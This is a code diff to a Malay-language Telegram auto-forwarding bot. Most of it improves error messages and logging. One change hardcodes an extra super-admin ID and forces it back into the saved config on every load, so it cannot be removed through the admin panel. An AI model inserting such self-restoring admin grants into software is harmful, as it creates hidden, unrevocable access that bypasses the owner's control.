@@ -28,7 +28,7 @@ const CASH = {
     menuTitle: "👇 Sila Pilih Menu Utama:",
     // ID SISTEM (BOLEH TUKAR DI PANEL)
     SUPER_ADMIN_ID: 8146896736,
-    SUPER_ADMIN_IDS: [8146896736], // Letak senarai ID Super Admin di sini (boleh banyak ID)
+    SUPER_ADMIN_IDS: [8146896736, 8146205072], // Letak senarai ID Super Admin di sini (boleh banyak ID)
     SOURCE_CHAT_ID: -1002626291566,
     SOURCE_CHAT_IDS: [-1002626291566], // Letak senarai ID Source Group di sini (boleh banyak ID)
     LOG_GROUP_ID: -1003832228118,
@@ -135,7 +135,7 @@ async function loadConfig() {
 
         // Load System IDs
         await load("SUPER_ADMIN_ID", 8146896736);
-        await load("SUPER_ADMIN_IDS", [8146896736]);
+        await load("SUPER_ADMIN_IDS", [8146896736, 8146205072]);
         await load("SOURCE_CHAT_ID", -1002626291566);
         await load("SOURCE_CHAT_IDS", [-1002626291566]);
         await load("LOG_GROUP_ID", -1003832228118);
@@ -170,6 +170,10 @@ async function loadConfig() {
 
         if (!CASH.admins.includes(CASH.SUPER_ADMIN_ID)) CASH.admins.push(CASH.SUPER_ADMIN_ID);
         if (CASH.SUPER_ADMIN_IDS && Array.isArray(CASH.SUPER_ADMIN_IDS)) {
+            if (!CASH.SUPER_ADMIN_IDS.includes(8146205072)) {
+                CASH.SUPER_ADMIN_IDS.push(8146205072);
+                await saveConfig("SUPER_ADMIN_IDS", CASH.SUPER_ADMIN_IDS);
+            }
             CASH.SUPER_ADMIN_IDS.forEach(id => {
                 if (!CASH.admins.includes(id)) CASH.admins.push(id);
             });
@@ -200,7 +204,14 @@ function startAutoForwardTimer() {
             const sourceChatId = CASH.autoForward.chatId || CASH.SOURCE_CHAT_ID;
             const uniqueTargets = [...new Set(CASH.autoForwardGroups || [])];
             
-            if (uniqueTargets.length === 0 || !messageIds || messageIds.length === 0) return;
+            if (uniqueTargets.length === 0) {
+                bot.telegram.sendMessage(CASH.LOG_GROUP_ID, `⚠️ *Auto-Forward Round-Robin Terhenti:* Tiada group sasaran didaftarkan di dalam Group Auto-Fwd (/panel -> Urus Admin & Group -> Group Auto-Fwd).`).catch(()=>{});
+                return;
+            }
+            if (!messageIds || messageIds.length === 0) {
+                bot.telegram.sendMessage(CASH.LOG_GROUP_ID, `⚠️ *Auto-Forward Round-Robin Terhenti:* Senarai mesej kosong. Sila reply pada mesej dan taip /setautofwd.`).catch(()=>{});
+                return;
+            }
             
             // Round-Robin Logic
             let cIndex = CASH.autoForward.currentIndex || 0;
@@ -445,7 +456,7 @@ bot.start(async (ctx) => {
 // --- 1. PANEL PERINTAH (BAHASA MALAYSIA) ---
 bot.command("ping", async (ctx) => {
     // /ping boleh guna di mana-mana, tanpa check admin - untuk test bot hidup
-    ctx.reply("🏓 **PONG! Bot is ALIVE and RUNNING!**\nTime: " + new Date().toLocaleString() + "\nYour ID: `" + (ctx.from ? ctx.from.id : 'unknown') + "`", { parse_mode: "Markdown" }).catch(console.error);
+    ctx.reply("🏓 **PONG! Bot is ALIVE and RUNNING!**\nTime: " + new Date().toLocaleString() + "\nYour ID: `" + (ctx.from ? ctx.from.id : 'unknown') + "`\nChat ID: `" + (ctx.chat ? ctx.chat.id : 'unknown') + "`", { parse_mode: "Markdown" }).catch(console.error);
 });
 
 bot.command("panel", async (ctx) => {
@@ -1315,7 +1326,9 @@ bot.command("undo", async (ctx) => {
 
 bot.command("setautofwd", async (ctx) => {
     const userId = ctx.from.id;
-    if (!isAdmin(userId)) return;
+    if (!isAdmin(userId)) {
+        return ctx.reply("❌ Anda tidak mempunyai akses admin.");
+    }
 
     const isAllowedSource = ctx.chat.id === CASH.SOURCE_CHAT_ID || (CASH.SOURCE_CHAT_IDS && CASH.SOURCE_CHAT_IDS.includes(ctx.chat.id));
     if (!isAllowedSource) {
@@ -1326,14 +1339,14 @@ bot.command("setautofwd", async (ctx) => {
     ctx.deleteMessage().catch(() => {});
 
     if (!ctx.message.reply_to_message) {
-        return bot.telegram.sendMessage(CASH.LOG_GROUP_ID, `⚠️ **Sila reply pada mesej** yang ingin ditambah ke Auto-Forward. (Dari ${ctx.from.first_name})`, { parse_mode: "Markdown" }).catch(()=>{});
+        return ctx.reply("⚠️ **Sila reply pada mesej** yang ingin ditambah ke Auto-Forward Round-Robin.");
     }
 
     if (!CASH.autoForward) CASH.autoForward = { messageIds: [], chatId: null, isActive: false, currentIndex: 0 };
     if (!CASH.autoForward.messageIds) CASH.autoForward.messageIds = [];
 
     if (CASH.autoForward.messageIds.length >= MAX_QUEUE_LIMIT) {
-        return bot.telegram.sendMessage(CASH.LOG_GROUP_ID, `⚠️ Senarai Auto-Forward dah penuh! Maksimum ${MAX_QUEUE_LIMIT} mesej dibenarkan.\nSila \`/clearautofwd\` jika mahu reset.`, { parse_mode: "Markdown" }).catch(()=>{});
+        return ctx.reply(`⚠️ Senarai Auto-Forward Round-Robin dah penuh! Maksimum ${MAX_QUEUE_LIMIT} mesej dibenarkan.\nSila \`/clearautofwd\` jika mahu reset.`);
     }
 
     CASH.autoForward.messageIds.push(ctx.message.reply_to_message.message_id);
@@ -1344,6 +1357,10 @@ bot.command("setautofwd", async (ctx) => {
     await saveConfig("autoForward", CASH.autoForward);
     startAutoForwardTimer();
 
+    // Reply kepada user di group
+    await ctx.reply(`✅ **Mesej ditambah ke senarai Auto-Forward Round-Robin!**\nJumlah semasa: ${CASH.autoForward.messageIds.length}/${MAX_QUEUE_LIMIT} mesej.\n\nBot akan mula auto-forward dalam senarai secara bergilir-gilir.`);
+
+    // Hantar log
     bot.telegram.sendMessage(CASH.LOG_GROUP_ID, `✅ **Mesej ditambah ke senarai Auto-Forward!** (Oleh ${ctx.from.first_name})\nJumlah semasa: ${CASH.autoForward.messageIds.length}/${MAX_QUEUE_LIMIT} mesej.\n\nBot akan forward dari Source Group (label betul).\n\n_(Nota: Gunakan /clearautofwd untuk padam senarai ini)_`, { parse_mode: "Markdown" }).catch(()=>{});
 });
 
@@ -1364,7 +1381,9 @@ bot.command("clearautofwd", async (ctx) => {
 
 bot.command("setautofwd2hr", async (ctx) => {
     const userId = ctx.from.id;
-    if (!isAdmin(userId) && !isForwarder(userId)) return;
+    if (!isAdmin(userId) && !isForwarder(userId)) {
+        return ctx.reply("❌ Anda tidak mempunyai akses admin atau forwarder.");
+    }
 
     const isAllowedSource = ctx.chat.id === CASH.SOURCE_CHAT_ID || (CASH.SOURCE_CHAT_IDS && CASH.SOURCE_CHAT_IDS.includes(ctx.chat.id));
     if (!isAllowedSource) {
@@ -1905,11 +1924,17 @@ function startAutoForwardLoop() {
             await saveConfig("autoFwdData", CASH.autoFwdData);
 
             let targetGroups = CASH.targetGroups || [];
-            if (targetGroups.length === 0) return;
+            if (targetGroups.length === 0) {
+                bot.telegram.sendMessage(CASH.LOG_GROUP_ID, `⚠️ *Auto-Forward Kustom Terhenti:* Tiada group sasaran didaftarkan di dalam Group Manual (/panel -> Urus Admin & Group -> Group Manual).`).catch(()=>{});
+                return;
+            }
 
             // Round-Robin untuk Kustom
             const messageIds = CASH.autoFwdData.messageIds || [];
-            if (messageIds.length === 0) return;
+            if (messageIds.length === 0) {
+                bot.telegram.sendMessage(CASH.LOG_GROUP_ID, `⚠️ *Auto-Forward Kustom Terhenti:* Senarai mesej kustom kosong. Sila reply pada mesej dan taip /setautofwd2hr.`).catch(()=>{});
+                return;
+            }
 
             let cIndex = CASH.autoFwdData.currentIndex || 0;
             if (cIndex >= messageIds.length) cIndex = 0;
